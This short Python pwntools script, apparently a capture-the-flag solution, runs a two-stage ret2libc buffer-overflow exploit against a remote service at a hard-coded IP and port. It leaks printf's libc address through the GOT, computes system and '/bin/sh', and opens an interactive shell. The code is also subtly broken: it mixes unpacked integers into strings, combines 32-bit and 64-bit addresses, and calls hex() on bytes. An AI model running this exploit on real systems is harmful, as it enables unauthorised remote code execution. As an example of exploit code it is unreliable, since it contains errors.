from pwn import *

# obtained from libc-database
offset_printf = 0x0064e40
offset_system  = 0x004f420
offset_binsh = 0x001b3d88

bin_sh = 0x007fffffffe291 + 6 # /bin/sh

buf = ""
buf += "A"*76
buf += 0x555555555030       # printf@plt
buf += 0x555555555155       # printf ret to vuln()
buf += 0x804852a            # "%s\n"
buf += 0x555555558018       # printf@got

# stage 1: leak libc address for printf
sh = remote("34.95.239.56", 9992)
sh.sendline(buf)
print(sh.recvline())
d = sh.recvline()
print("leak:", d)
addr_printf = d[:4]

print("addr_printf:", hex(addr_printf))

libc_base = addr_printf - offset_printf
print("libc_base:", hex(libc_base))

# local offsets
addr_system = libc_base + offset_system
addr_binsh  = libc_base + offset_binsh

print( "system:", hex(addr_system))
print( "/bin/sh:", hex(addr_binsh))

# stage 2: get a shell execve("/bin/sh")
buf = ""
buf += "A"*76
buf += addr_system
buf += "XXXX"
buf += addr_binsh

print("trying to get shell...")
sh.sendline(buf)
sh.interactive()
sh.close()